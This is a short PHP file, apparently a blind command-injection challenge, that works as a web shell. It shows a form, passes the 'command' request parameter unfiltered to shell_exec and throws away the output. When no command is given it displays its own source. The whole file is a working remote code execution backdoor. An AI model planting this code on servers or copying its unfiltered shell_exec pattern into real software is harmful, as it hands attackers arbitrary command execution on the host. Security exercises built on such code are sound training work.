<?php

echo "<form><input placeholder=Command name=command maxlen=250 autofocus> <input type=submit value=Execute></form><br>";

if(!isset($_REQUEST['command'])){
    highlight_file(__FILE__);
    exit;
}

try
{
    @shell_exec($_REQUEST['command']);
} catch(Exception $e){
    // It's blind anyway!
}